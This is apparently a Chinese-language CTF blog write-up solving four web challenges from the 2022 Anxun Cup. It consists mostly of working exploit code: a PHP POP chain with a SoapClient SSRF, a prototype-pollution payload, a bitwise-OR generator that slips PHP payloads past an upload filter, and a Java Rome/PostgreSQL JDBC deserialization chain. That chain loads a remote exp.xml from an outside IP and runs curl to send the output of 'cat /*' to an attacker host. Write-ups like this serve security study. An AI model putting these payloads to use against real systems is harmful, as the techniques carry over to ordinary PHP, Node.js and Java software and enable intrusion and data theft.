---
title: "2022 安洵杯 Web Writeup"
date: 2022-11-28T09:56:41+08:00
lastmod: 2022-11-28T09:56:41+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

被学长们带飞了

<!--more-->

## babyphp

index.php

```php
<?php
//something in flag.php

class A
{
    public $a;
    public $b;

    public function __wakeup()
    {
        $this->a = "babyhacker";
    }

    public function __invoke()
    {
        if (isset($this->a) && $this->a == md5($this->a)) {
            $this->b->uwant();
        }
    }
}

class B
{
    public $a;
    public $b;
    public $k;

    function __destruct()
    {
        $this->b = $this->k;
        die($this->a);
    }
}

class C
{
    public $a;
    public $c;

    public function __toString()
    {
        $cc = $this->c;
        return $cc();
    }
    public function uwant()
    {
        if ($this->a == "phpinfo") {
            phpinfo();
        } else {
            call_user_func(array(reset($_SESSION), $this->a));
        }
    }
}


if (isset($_GET['d0g3'])) {
    ini_set($_GET['baby'], $_GET['d0g3']);
    session_start();
    $_SESSION['sess'] = $_POST['sess'];
}
else{
    session_start();
    if (isset($_POST["pop"])) {
        unserialize($_POST["pop"]);
    }
}
var_dump($_SESSION);
highlight_file(__FILE__);
```

flag.php

```php
<?php
session_start();
highlight_file(__FILE__);
//flag在根目录下
if($_SERVER["REMOTE_ADDR"]==="127.0.0.1"){
    $f1ag=implode(array(new $_GET['a']($_GET['b'])));
    $_SESSION["F1AG"]= $f1ag;
}else{
   echo "only localhost!!";
}
```

通过构造 pop 链查看 phpinfo 发现 `session.serialize_handler` 为 php, 再结合 flag.php 的源码推测是利用 session 反序列化 SoapClient 来进行 ssrf

思路就是先控制 ini\_set 的参数指定 serialize\_handler 为 php\_serialize, 传参 sess 为反序列化 SoapClient 的 payload, 然后去掉所有 get post 参数访问一次页面触发反序列化, 最后利用已知 pop 链调用 SoapClient \_\_call 方法来触发 ssrf

ssrf 则先利用 php 的原生类 GlobIterator 来查找根目录下以 f 开头的文件, 然后利用 SplFileObject 读取 flag

pop 链 payload

```php
<?php

class A
{
    public $a;
    public $b;
}

class B
{

}

class C
{
    public $a;
    public $c;
}


$cc = new C();
$cc->a = 'xxxx';

$a = new A();
$a->a = '0e215962017';
$a->b = $cc;

$c = new C();
$c->c = $a;

$b = new B();
$b->a = $c;

echo serialize($b);
```

ssrf payload

```php
<?php
    
// $a = new SoapClient(null,array('location' => 'http://127.0.0.1/flag.php?a=GlobIterator&b=/f*', 'user_agent' => "111\r\nCookie: PHPSESSID=c9urdtg4kjp5jl36mrl44qlsah", 'uri' => 'test'));

$a = new SoapClient(null,array('location' => 'http://127.0.0.1/flag.php?a=SplFileObject&b=/f1111llllllaagg', 'user_agent' => "111\r\nCookie: PHPSESSID=c9urdtg4kjp5jl36mrl44qlsah", 'uri' => 'test'));
$b = serialize($a);
echo '|'.urlencode($b);
```

先利用 GlobIterator

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271930808.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271931449.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271934414.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271935912.png)

再利用 SplFileObject

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271936690.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271936090.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271938787.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271938294.png)

## EZ_JS

登录界面随便输入账号密码, 之后会跳转到 /cookie 路由, 右键注释 jsfuck 解密提示 `输入大写`

主页右键注释如下

```html
<!--This secret is 7 characters long for security!
hash=md5(secret+"flag");//1946714cfa9deb70cc40bab32872f98a
admin cookie is   md5(secret+urldecode("flag%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00X%00%00%00%00%00%00%00dog"));
-->
```

一眼哈希长度扩展攻击

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271942270.png)

直接更改 cookie hash 发现没有用, 后来又将 userid 置空, 出现报错

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271943926.png)

结合之前的提示, 利用 js 的大小写特性

```javascript
'ı'.toUpperCase() == 'I' // true
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271944110.png)

之后跳转到 /infoflllllag (静态环境每 30 分钟重置, 所以截的是之前的图)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271945062.png)

```javascript
var express = require('express');
var router = express.Router();


const isObject = obj => obj && obj.constructor && obj.constructor === Object;
const merge = (a, b) => {
  for (var attr in b) {
    if (isObject(a[attr]) && isObject(b[attr])) {
      merge(a[attr], b[attr]);
    } else {
      a[attr] = b[attr];
    }
  }
  return a
}
const clone = (a) => {
  return merge({}, a);
}




router.get('/', function(req, res, next) { 
  if(req.flag=="flag"){
    //输出flag;
    res.send('flag?????????????');
    }
    res.render('info');
});

router.post('/', express.json(),function(req, res) {
  var str = req.body.id;
  var obj = JSON.parse(str);
  req.cookies.id=clone(obj);
  res.render('info');
});

module.exports = router;
```

很明显要通过原型链来污染 req 的 flag 属性, payload 如下

```
id={"__proto__":+{"flag":+"flag"}}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271947808.png)

之后转 get 访问得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271948522.png)

静态靶机的截图

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271948518.png)

## ezupload

先上传 phpinfo

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271949581.png)

php 8.0.1, disable\_functions 过滤了一堆, 不过 `file_get_contents()` 可用, 通过它读取题目源码

```php

<html>
<body>
<form method="POST" enctype="multipart/form-data">
这前端不美si你！！！
<input type="file" name="upload_file" />
<input type="submit" name="submit" value="submit" />
</form>
</body>
</html>
<?php
function waf($var): bool{
    $blacklist = ["\$_", "eval","copy" ,"assert","usort","include", "require", "$", "^", "~", "-", "%", "*","file","fopen","fwriter","fput","copy","curl","fread","fget","function_exists","dl","putenv","system","exec","shell_exec","passthru","proc_open","proc_close", "proc_get_status","checkdnsrr","getmxrr","getservbyname","getservbyport", "syslog","popen","show_source","highlight_file","`","chmod"];

    foreach($blacklist as $blackword){
        if(stristr($var, $blackword)) return True;
    }

    return False;
}
error_reporting(0);
//设置上传目录
define("UPLOAD_PATH", "./uploads");
$msg = "Upload Success!";
if (isset($_POST['submit'])) {
$temp_file = $_FILES['upload_file']['tmp_name'];
$file_name = $_FILES['upload_file']['name'];
$ext = pathinfo($file_name,PATHINFO_EXTENSION);
if(!preg_match("/php/i", strtolower($ext))){
die("俺不要图片,熊大");
}

$content = file_get_contents($temp_file);
if(waf($content)){
    die("哎呦你干嘛，小黑子...");
}
$new_file_name = md5($file_name).".".$ext;
        $img_path = UPLOAD_PATH . '/' . $new_file_name;


        if (move_uploaded_file($temp_file, $img_path)){
            $is_upload = true;
        } else {
            $msg = 'Upload Failed!';
            die();
        }
        echo $msg."  ".$img_path;
}
```

位运算 `& |` 没有被过滤, 这里以 `|` 为例, 利用 GlobIterator 查找 flag

```python
import re

preg = '\*'

def convertToURL(s):
    if s < 16:
        return '%0' + str(hex(s).replace('0x', ''))
    else:
        return '%' + str(hex(s).replace('0x', ''))

def generateDicts():
    dicts = {}
    for i in range(256):
        for j in range(256):
            if not re.match(preg, chr(i), re.I) and not re.match(preg, chr(j), re.I):
                k = i | j
                if k in range(32, 127):
                    if not k in dicts.keys():
                        dicts[chr(k)] = [convertToURL(i), convertToURL(j)]
    return dicts

def generatePayload(dicts, payload):
    s1 = ''
    s2 = ''
    for s in payload:
        s1 += dicts[s][0]
        s2 += dicts[s][1]
    return f'("{s1}"|"{s2}")'

dicts = generateDicts()
a = generatePayload(dicts, '/f*')
print(a)
```

payload

```php
<?php echo new GlobIterator('/f('|'/f"');
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271954406.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271954423.png)

然后用 `file_get_contents()` 读取 flag

```php
<?php echo ('fil'.'e_ge'.'t_cont'.'ents')('/fl1111111111ag');
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271955530.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271955702.png)

## ezjaba

pom.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.7.5</version>
        <relativePath/> <!-- lookup parent from repository -->
    </parent>
    <groupId>com.example</groupId>
    <artifactId>ezjaba</artifactId>
    <version>0.0.1-SNAPSHOT</version>
    <name>ezjaba</name>
    <description>ezjaba</description>
    <properties>
        <java.version>1.8</java.version>
    </properties>
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>

        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-test</artifactId>
            <scope>test</scope>
        </dependency>
        <dependency>
            <groupId>com.rometools</groupId>
            <artifactId>rome</artifactId>
            <version>1.7.0</version>
        </dependency>
        <dependency>
            <groupId>org.postgresql</groupId>
            <artifactId>postgresql</artifactId>
            <version>42.3.1</version>
        </dependency>
        <dependency>
            <groupId>mysql</groupId>
            <artifactId>mysql-connector-java</artifactId>
            <version>8.0.12</version>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
        </plugins>
    </build>

</project>
```

IndexController

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271957830.png)

Database

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271957963.png)

JdbcUtils

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271957966.png)

SecurityObjectInpitStream

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211271958986.png)

过滤了 mysql jdbc 反序列化, 网上查了一会发现最近 postgresql 依赖的 cve

[https://xz.aliyun.com/t/11812](https://xz.aliyun.com/t/11812)

[https://mp.weixin.qq.com/s?__biz=MzUzNDMyNjI3Mg==&mid=2247485275&idx=1&sn=e06b07579ecef87f8cce4536d25789ce](https://mp.weixin.qq.com/s?__biz=MzUzNDMyNjI3Mg==&mid=2247485275&idx=1&sn=e06b07579ecef87f8cce4536d25789ce)

结合 pom.xml 中的 rome, 通过 ToStringBean 来触发任意 getter

在题目中是利用 Database getConnection 这个 getter 来触发 jdbc 漏洞

之后从 marshalsec 的源码中找到 XString, 它的 equals 方法会调用 toString, 最终结合 hashCode 碰撞完成整条反序列化链

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211272004771.png)

payload

```java
package com.example.ezjaba;

import com.example.Reflection;
import com.example.ezjaba.Connection.Database;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.org.apache.xpath.internal.objects.XString;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.*;

public class RomeDemo {

    public static void main(String[] args) throws Exception{
        Database database = new Database();
        database.setDatabase("postgresql");
        database.setHots("127.0.0.1");
        database.setUsername("test");
        
        database.setPassword("=123456&socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://1.117.70.230:65001/exp.xml");
        ToStringBean toStringBean = new ToStringBean(String.class, "123");
        XString xString = new XString("456");

        Map map1 = new HashMap();
        Map map2 = new HashMap();
        map1.put("yy",toStringBean);
        map1.put("zZ",xString);
        map2.put("yy",xString);
        map2.put("zZ",toStringBean);

        Map map = new HashMap();
        map.put(map1, 1);
        map.put(map2, 2);

        Reflection.setFieldValue(toStringBean, "beanClass", Database.class);
        Reflection.setFieldValue(toStringBean, "obj", database);

        ByteArrayOutputStream arr = new ByteArrayOutputStream();
        try (ObjectOutputStream output = new ObjectOutputStream(arr)){
            output.writeUTF("axb");
            output.writeInt(2022);
            output.writeObject(map);
        }

        System.out.println(Base64.getEncoder().encodeToString(arr.toByteArray()));

    }
}
```

exp.xml

```xml
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:p="http://www.springframework.org/schema/p"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd">
<!--    普通方式创建类-->
   <bean id="exec" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>bash</value>
            <value>-c</value>
            <value>curl http://x.x.x.x:yyyy/ -X POST -d "`ls /;cat /*`"</value>
          </list>
        </constructor-arg>
    </bean>
</beans>
```

vps 上挂着 exp.xml, 然后用 base64 payload 打一下

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211272107558.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211272108046.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211272114396.png)